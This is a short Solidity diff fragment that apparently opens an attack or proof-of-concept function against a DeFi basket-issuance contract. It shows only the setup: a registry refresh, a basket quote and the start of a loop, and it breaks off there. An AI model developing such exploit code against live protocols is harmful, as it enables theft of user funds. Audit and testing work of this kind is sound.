+    function attack(uint192 amount, uint256 round) external onlyOwner {
+        assetRegistry.refresh();
+        // Assume issueAmount == basketAmount for simplicity
+        (address[] memory erc20s, uint256[] memory quantities) = basketHandler.quote(amount, CEIL);
+        // Prepare assets
+        for (uint256 i = 0; i < erc20s.length; i++) {
